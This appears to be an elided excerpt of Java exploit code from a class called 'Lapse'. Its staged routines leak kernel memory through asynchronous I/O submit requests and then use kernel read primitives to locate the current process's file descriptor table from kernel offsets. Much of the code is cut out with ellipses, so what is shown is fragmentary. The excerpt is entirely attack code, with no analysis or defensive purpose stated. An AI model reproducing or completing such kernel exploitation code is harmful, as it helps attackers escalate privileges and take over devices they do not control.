...
public class Lapse {
    ...
    public static boolean executeStage2(int[] aliasedPair) {
        ...
        try {
            ...
            // evf.cv.cv_description = "evf cv" - string is located at the kernel's mapped
            // ELF file
            ...
            for (int i = 1; i <= NUM_LEAKS; i++) {
                ...
                for (int j = 1; j <= numLoop; j++) {
                    wbuf.putInt(8, j);
                    Helper.aioSubmitCmd(cmd, leakReqs.address(), numElems, Helper.AIO_PRIORITY_HIGH,
    ...
    public static boolean executeStage4(int[] pktoptsSds, long k100Addr, long kernelAddr,
        ...
        long curprocOfiles = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, curprocFd)
                + KernelOffset.FILEDESC_OFILES;
        ...
        long workerFdData = Kernel.getFdDataAddrSlow(masterSock, pktinfo, pktinfoLen, readBuf, workerSock,
                curprocOfiles);
